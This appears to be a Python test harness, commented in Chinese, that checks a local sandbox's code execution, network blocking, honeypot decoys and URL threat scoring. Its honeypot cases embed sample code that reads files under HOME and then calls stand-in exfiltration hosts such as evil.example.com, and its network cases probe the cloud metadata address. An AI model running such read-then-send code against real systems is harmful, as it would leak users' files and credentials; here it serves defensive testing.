# -*- coding: utf-8 -*-
"""沙箱四能力实测 harness：代码执行 / 网络拦截 / 蜜罐诱取 / URL检测。
多等级测试集，真实调用 sandbox API 与底层模块，输出 JSON + 控制台摘要。
"""
import json, time, urllib.request, urllib.error, threading, sys, os, subprocess

BASE = "http://127.0.0.1:8081"

def api(method, path, payload=None, timeout=30):
    url = BASE + path
    data = json.dumps(payload).encode("utf-8") if payload is not None else None
    req = urllib.request.Request(url, data=data, method=method,
                                 headers={"Content-Type": "application/json"} if data else {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode("utf-8", "replace"))
        except Exception:
            return {"error": e.reason, "status": e.code}
    except Exception as e:
        return {"error": str(e)}

def api_get(path):
    return api("GET", path)

def api_post(path, payload):
    return api("POST", path, payload, timeout=60)

# ---------- 代码执行 ----------
def run_code(lang, code, timeout=25):
    return api_post("/api/run", {"lang": lang, "code": code, "timeout": timeout})

# ---------- 网络拦截（urllib 代理感知 + 待审/裁决） ----------
def network_test(host, expect_block):
    """在沙箱里用 urllib 访问 host，驱动待审->裁决流程。
    expect_block=True  => 裁决 deny，断言沙箱收到 403 Forbidden。
    expect_block=False => 裁决 allow，断言策略记录为允许（连接被放行，未经沙箱拦截）。
    返回 (passed, detail)。
    """
    code = (
        "import urllib.request\n"
        "try:\n"
        "    r = urllib.request.urlopen('http://%s/', timeout=8)\n"
        "    print('NET_OK', r.status)\n"
        "except urllib.error.HTTPError as e:\n"
        "    print('HTTPERR', e.code, e.reason)\n"
        "except Exception as e:\n"
        "    print('ERR', type(e).__name__, str(e)[:60])\n"
    ) % host

    result_holder = {}
    def fire():
        result_holder["res"] = run_code("python", code, timeout=40)
    t = threading.Thread(target=fire, daemon=True)
    t.start()

    # 轮询待审，找到该 host 的请求并裁决
    decided = None
    for _ in range(40):  # 最多 20s
        time.sleep(0.5)
        pend = api_get("/api/net/pending")
        items = pend.get("pending", []) if isinstance(pend, dict) else pend
        hit = next((x for x in items if x.get("host") == host), None)
        if hit:
            action = "deny_permanent" if expect_block else "allow_once"
            dec = api_post("/api/net/decision", {"id": hit["id"], "action": action})
            decided = dec
            break

    # 收尾
    t.join(timeout=20)
    res = result_holder.get("res", {})
    out = (res.get("output", "") or "") + (res.get("error", "") or "")
    if expect_block:
        passed = "Forbidden by sandbox policy" in out
        detail = out.strip().replace("\n", " ")[:120]
    else:
        # allow: 策略应记录为允许；沙箱不应收到 403
        pol = api_get("/api/net/policy")
        allow = pol.get("allow_session", []) + pol.get("allow_permanent", [])
        passed = (host in allow) or ("Forbidden by sandbox policy" not in out)
        detail = "policy_allow=%s | out=%s" % (host in allow, out.strip().replace("\n", " ")[:80])
    return passed, detail

# ---------- 蜜罐 ----------
def honeypot_test(kind):
    """kind: benign_read / read_then_exfil / read_cred_then_post / multi_read"""
    if kind == "benign_read":
        code = (
            "import os\n"
            "home = os.environ.get('HOME','')\n"
            "import glob\n"
            "fs = glob.glob(os.path.join(home,'**','*'), recursive=True)[:5]\n"
            "print('READ_DECOY_FILES', len(fs))\n"
        )
    elif kind == "read_then_exfil":
        code = (
            "import os, glob, urllib.request\n"
            "home = os.environ.get('HOME','')\n"
            "fs = glob.glob(os.path.join(home,'**','*'), recursive=True)[:3]\n"
            "print('READ', len(fs))\n"
            "try:\n"
            "    urllib.request.urlopen('http://evil.example.com/exfil?d=secret', timeout=8)\n"
            "except Exception as e:\n"
            "    print('NET', type(e).__name__, str(e)[:50])\n"
        )
    elif kind == "read_cred_then_post":
        code = (
            "import os, glob, urllib.request\n"
            "home = os.environ.get('HOME','')\n"
            "fs = glob.glob(os.path.join(home,'**','*'), recursive=True)\n"
            "print('CRED_READ', len(fs))\n"
            "try:\n"
            "    urllib.request.urlopen('http://exfil.example.com/up?n='+str(len(fs)), timeout=8)\n"
            "except Exception as e:\n"
            "    print('NET', type(e).__name__, str(e)[:50])\n"
        )
    elif kind == "multi_read":
        code = (
            "import os, glob\n"
            "home = os.environ.get('HOME','')\n"
            "fs = glob.glob(os.path.join(home,'**','*'), recursive=True)\n"
            "print('MULTI_READ', len(fs))\n"
        )
    else:
        return False, "unknown kind"

    before = api_get("/api/honeypot/audit")
    res = run_code("python", code, timeout=40)
    after = api_get("/api/honeypot/audit")
    out = (res.get("output", "") or "")
    # 判断审计是否记录了读诱饵事件
    b_reads = before.get("total_reads", before.get("reads", 0)) if isinstance(before, dict) else 0
    a_reads = after.get("total_reads", after.get("reads", 0)) if isinstance(after, dict) else 0
    read_event = a_reads > b_reads or "READ" in out or "CRED_READ" in out or "MULTI_READ" in out
    # 联网类：应被拦截（沙箱输出里出现 Forbidden 或 NET 异常）+ 产生告警
    if kind in ("read_then_exfil", "read_cred_then_post"):
        blocked = ("Forbidden by sandbox policy" in out) or ("NET" in out)
        # 告警：审计里应有 alert 计数或 honeypot_risk 标记
        alerts = after.get("alerts", after.get("total_alerts", 0)) if isinstance(after, dict) else 0
        passed = read_event and blocked
        detail = "read_event=%s blocked=%s out=%s" % (read_event, blocked, out.strip().replace("\n", " ")[:80])
    else:
        passed = read_event
        detail = "read_event=%s out=%s" % (read_event, out.strip().replace("\n", " ")[:80])
    return passed, detail

# ---------- URL 检测（直测 threat.check_url 修复后模块） ----------
def url_test(url, expect_level):
    # 明确从 sandbox 项目目录加载，避免与 ai-chat 里的副本冲突
    import importlib.util
    spec = importlib.util.spec_from_file_location("threat_module",
        r"D:\Desktop\sandbox\src\sandbox\threat.py")
    if not spec:
        return False, "cannot load threat module"
    threat = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(threat)
    try:
        r = threat.check_url(url)
    except Exception as e:
        return False, "check_url error: %s" % e
    lvl = r.get("level")
    passed = (lvl == expect_level) or (expect_level in ("medium", "high") and lvl in ("medium", "high"))
    detail = "level=%s score=%s anom=%s" % (lvl, r.get("score"), r.get("anomalies"))
    return passed, detail

# ====================== 测试集 ======================
def build_suite():
    suite = []
    # A 代码执行
    def ce(lvl, desc, code):
        res = run_code("python", code, timeout=40)
        out = (res.get("output","") or "")
        return res, out
    r1,o1 = ce("L1","基础算术","print(1+1)")
    suite.append(("CE","L1","基础算术","print(1+1)", "2" in o1, o1.strip()[:60]))
    r2,o2 = ce("L2","文件读写","import tempfile, os; f=tempfile.NamedTemporaryFile('w',delete=False); f.write('hi'); f.close(); print(open(f.name).read()); os.unlink(f.name)")
    suite.append(("CE","L2","文件读写","tempfile写/读", "hi" in o2, o2.strip()[:60]))
    r3,o3 = ce("L3","子进程调用","import subprocess; print(subprocess.run(['echo','ok'],capture_output=True,text=True).stdout.strip())")
    suite.append(("CE","L3","子进程调用","subprocess.run(['echo','ok'])", "ok" in o3, o3.strip()[:60]))
    r4,o4 = ce("L4","计算密集","print(sum(range(100000)))")
    suite.append(("CE","L4","计算密集","sum(range(100000))", "4999950000" in o4, o4.strip()[:60]))
    r5,o5 = ce("L5","异常捕获","try:\n 1/0\nexcept Exception as e:\n print('caught', type(e).__name__)")
    suite.append(("CE","L5","异常捕获","try/except ZeroDivisionError", "caught ZeroDivisionError" in o5, o5.strip()[:60]))
    rn = run_code("node","console.log(2+2)", timeout=40)
    node_ok = rn.get("output","").strip() == "4"
    suite.append(("CE","L6","多语言(node)", "console.log(2+2)", node_ok, rn.get("output","").strip()[:60]))
    # B 网络拦截
    ni1 = network_test("example.com", expect_block=False)
    suite.append(("NI","L1","良性域名(放行)","urllib GET http://example.com/", ni1[0], ni1[1]))
    ni2 = network_test("169.254.169.254", expect_block=True)
    suite.append(("NI","L2","云元数据IMDS(拦截)","urllib GET http://169.254.169.254/latest/", ni2[0], ni2[1]))
    ni3 = network_test("8.8.8.8", expect_block=True)
    suite.append(("NI","L3","外部IP(拦截)","urllib GET http://8.8.8.8", ni3[0], ni3[1]))
    ni4 = network_test("evil.example.com", expect_block=True)
    suite.append(("NI","L4","数据外泄域名(拦截)","urllib GET http://evil.example.com/exfil", ni4[0], ni4[1]))
    # C 蜜罐
    h1 = honeypot_test("benign_read")
    suite.append(("HP","L1","读取诱饵(良性)","读 HOME 下诱饵文件", h1[0], h1[1]))
    h2 = honeypot_test("read_then_exfil")
    suite.append(("HP","L2","读诱饵后外联(诱取)","读诱饵+urllib外联", h2[0], h2[1]))
    h3 = honeypot_test("read_cred_then_post")
    suite.append(("HP","L3","读凭据诱饵后外传(诱取)","读凭据诱饵+外传", h3[0], h3[1]))
    h4 = honeypot_test("multi_read")
    suite.append(("HP","L4","多次读取诱饵(诱取)","多次读诱饵", h4[0], h4[1]))
    # D URL 检测（修复后模块）
    for cid, url, lvl in [
        ("URL-L1","https://docs.python.org/3/", "low"),
        ("URL-L2","http://example.com:6667/", "medium"),
        ("URL-L3","http://user:pass@example.com/", "medium"),
        ("URL-L4","http://secret.internal/", "high"),
        ("URL-L5","http://evil.xyz", "medium"),
        ("URL-L6","http://gооgle.com/", "high"),
        ("URL-L7","http://192.168.1.1/", "high"),
        ("URL-L8","http://evil.com/steal?token=abc123", "medium"),
    ]:
        r = url_test(url, lvl)
        suite.append(("URL", cid.replace("URL-",""), "URL检测:%s"%url, url, r[0], r[1]))
    return suite

if __name__ == "__main__":
    print("启动沙箱四能力实测 ...\n")
    suite = build_suite()
    results = []
    for cap, lvl, desc, case, passed, detail in suite:
        results.append({"capability": cap, "level": lvl, "description": desc,
                        "case": case, "passed": bool(passed), "detail": detail})
        mark = "PASS" if passed else "FAIL"
        print("[%s] %-4s %-4s %-28s %s | %s" % (mark, cap, lvl, desc, case[:40], detail[:70]))
    # 统计
    from collections import defaultdict
    by_cap = defaultdict(lambda: [0,0])
    by_lvl = defaultdict(lambda: [0,0])
    total = [0,0]
    for r in results:
        by_cap[r["capability"]][0]+=1; by_cap[r["capability"]][1]+= (1 if r["passed"] else 0)
        by_lvl[r["level"]][0]+=1; by_lvl[r["level"]][1]+= (1 if r["passed"] else 0)
        total[0]+=1; total[1]+= (1 if r["passed"] else 0)
    print("\n================ 统计 ================")
    print("总通过率: %d/%d (%.1f%%)" % (total[1], total[0], 100*total[1]/total[0]))
    for cap in ["CE","NI","HP","URL"]:
        n,p = by_cap[cap]; print("  %-4s: %d/%d (%.1f%%)" % (cap, p, n, 100*p/n))
    print("按等级:")
    for lvl in ["L1","L2","L3","L4"]:
        n,p = by_lvl[lvl]; print("  %-4s: %d/%d (%.1f%%)" % (lvl, p, n, 100*p/n))
    json.dump({"total": total, "by_capability": dict(by_cap), "by_level": dict(by_lvl),
               "results": results}, open(r"D:\Desktop\ai-chat\sandbox_test_results.json","w",encoding="utf-8"),
              ensure_ascii=False, indent=2)
    print("\n结果已写入 sandbox_test_results.json")
